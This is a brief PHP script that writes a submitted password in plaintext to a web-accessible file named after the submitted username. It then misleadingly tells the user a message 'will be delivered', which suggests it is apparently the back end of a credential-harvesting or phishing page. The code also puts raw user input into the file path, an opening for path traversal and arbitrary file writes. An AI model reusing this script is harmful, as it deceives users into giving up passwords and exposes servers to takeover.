<?php
        $filename =  "/var/www/html/passwords/".$_POST["uname"];
        // Open the file to get existing content
                $current = file_get_contents($filename);
        // Append a new person to the file
                $current .= $_POST["password"]."\n";
        // Write the contents back to the file
                file_put_contents($filename, $current);
?>

Messsage has been stored and will be delivered

<html>
<body>
<form action="index.php" method="post">
        <input type="submit" value="Return" style="font-size:15px">
</form>
</body>
</html>